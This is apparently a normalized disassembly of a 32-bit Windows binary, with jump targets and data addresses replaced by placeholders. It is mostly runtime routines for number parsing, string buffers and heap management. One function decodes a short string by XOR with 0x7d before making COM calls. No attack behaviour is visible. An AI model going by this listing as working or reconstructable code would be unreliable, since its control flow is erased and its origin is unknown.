mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ r--data ]
mov [ ebp - 0x220 ] eax
movsx eax [ edx ]
push ebx
push esi
xor eax 0xffdf
push edi
mov edi [ rw-data ]
mov [ ebp - 0x21c ] ecx
xor ecx ecx
and eax 0xff
mov [ ebp - 0x218 ] ax
mov [ ebp - 0x216 ] cx
cmp [ edi + 0x120 ] ecx
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x208
push ecx
lea edx [ ebp - 0x210 ]
push edx
call sub_10079a10
lea eax [ ebp - 0x214 ]
add esp 0xc
push eax
call sub_1003b1ca
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x210 ]
xor esi esi
lea esp [ esp ]
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x210 ]
push ebx
mov edx 0x7fffffff
call sub_1006c8f0
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
call sub_1003b1ca
mov ecx [ ebp - 0x214 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x214 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x218 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1003d910
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x21c ]
call sub_10016e80
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x4
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100677b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x78 ] eax
inc edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x70 ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
push ebx
push esi
push 0x2
mov [ ebp - 0x54 ] edx
pop esi
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
xor eax eax
jmp r-xdata
add edx esi
jmp r-xdata
cmp eax 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10024145
leave
retn
movzx eax [ edx ]
cmp eax 0x20
je r-xdata
cmp eax 0xa
je r-xdata
cmp eax 0xd
jne r-xdata
push 0x30
pop ebx
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10067ec7 ]
movzx eax [ edx ]
add edx esi
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x5c ] edi
cmp cx 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
mov [ ebp - 0x5c ] edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] edi
jne r-xdata
add eax 0xffffffd0
mov [ ebp - 0x6c ] edi
cmp ax 0x9
ja r-xdata
lea ecx [ edx - 0x4 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
mov [ ebp - 0x60 ] edi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] edi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x78 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
je r-xdata
cmp ax bx
jae r-xdata
cmp ax bx
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp ax bx
je r-xdata
cmp ax bx
jmp r-xdata
push 0xa
pop ecx
sub edx esi
sub eax 0x2b
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp ax bx
jae r-xdata
mov [ ebp - 0x70 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
sub eax 0x2b
je r-xdata
push 0x5
cmp eax 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp eax ebx
je r-xdata
cmp ax 0x39
ja r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
movzx eax ax
cmp eax ecx
je r-xdata
cmp ax 0x39
ja r-xdata
movzx eax ax
jmp r-xdata
cmp ax bx
je r-xdata
pop ecx
sub edx esi
jmp r-xdata
push 0x7
jmp r-xdata
sub eax esi
je r-xdata
movzx eax [ edx ]
add edx esi
add eax 0xffffffcf
cmp ax 0x8
jbe r-xdata
jne r-xdata
sub eax esi
je r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
mov eax [ ebp - 0x58 ]
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
mov ecx esi
jmp r-xdata
sub eax esi
je r-xdata
sub edx esi
push 0xb
jmp r-xdata
cmp eax 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp eax 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
movzx eax [ edx ]
add edx esi
jmp r-xdata
or [ ebp - 0x64 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
sub edx esi
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x68 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movzx edi ax
lea ecx [ ecx + edi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x58 ]
dec eax
inc [ ebp - 0x50 ]
jmp r-xdata
inc [ ebp - 0x9 ]
mov ecx esi
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax ebx
je r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
inc [ ebp - 0x4c ]
sub al bl
inc [ ebp - 0x58 ]
mov [ ecx ] al
jmp r-xdata
cmp eax 0x2d
je r-xdata
movzx eax [ edx ]
add edx esi
inc [ ebp - 0x4c ]
mov ecx [ ebp - 0x58 ]
sub al bl
inc [ ebp - 0x58 ]
dec [ ebp - 0x50 ]
mov [ ecx ] al
cmp ax bx
jae r-xdata
mov ecx 0x1451
movzx eax [ edx ]
add edx esi
dec eax
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp eax 0x43
jle r-xdata
movzx eax [ edx ]
add edx esi
jmp r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1001897c
mov eax [ ebp - 0x68 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x64 ] edx
jge r-xdata
cmp eax 0x45
jle r-xdata
movzx eax [ edx ]
add edx esi
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
add eax 0xffffff9c
cmp eax edi
ja r-xdata
cmp [ ebp - 0x6c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x70 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi + 0x2 ] esi
pop esi
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x70 ]
mov [ edi ] cx
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x70 ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x78 ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x78 ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x4c ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x64 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x5c ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x64 ]
dec [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x6c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
add eax eax
mov [ ebp - 0x68 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x50 ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x68 ]
cmp [ ebp - 0x68 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x50 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x60 ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x50 ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x58 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x4c ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x4c ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10067ef7
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_1003f510
push 0xffffffff
push eax
call sub_1002b580
jmp r-xdata
pop ebp
retn 0x8
sub_10067f1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10010183
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_1004fd82
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_10067f90
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10016d10
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10035d20
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10035d20
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10068130
mov eax [ esi + 0x2c0 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0x2d8 ] 0x8
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x2c0 ] 0x0
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] 0x0
mov [ esi + 0x2c4 ] cx
mov ecx esi
jmp sub_1003eba0
mov eax [ esi + 0x2c4 ]
push eax
call sub_1006591f
add esp 0x4
sub_100681b5
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100288ef
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10068252
push 0x58
mov eax sub_1007f593
call sub_1001bb6b
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1005434f
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_10069ce0
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10028071
mov [ ebp - 0x4 ] 0x3
call sub_1004ff82
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1004fa89
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000adb0
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x50 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1000def6
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100614ea
mov ecx [ eax ]
push edi
push [ ebp - 0x50 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_1000def6
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_100683b0
cmp esi edi
je r-xdata
mov eax esi
retn
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100683f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080818
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_1000a810
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x1c
call sub_100050e0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10068530
push ebp
mov ebp esp
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x90 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7d
and edx 0xff
mov [ ebp + eax * 2 - 0x50 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
push edx
mov [ ebp - 0x30 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0xfc ] 0x8
lea eax [ edi + 0xe8 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x2c ]
lea eax [ ecx + 0x47 ]
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_100050e0
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x90 ]
push eax
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x90 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x87
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
call sub_100050e0
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x98 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x8c ]
mov eax 0xa1
call sub_100050e0
mov esi 0x1
xor ebx ebx
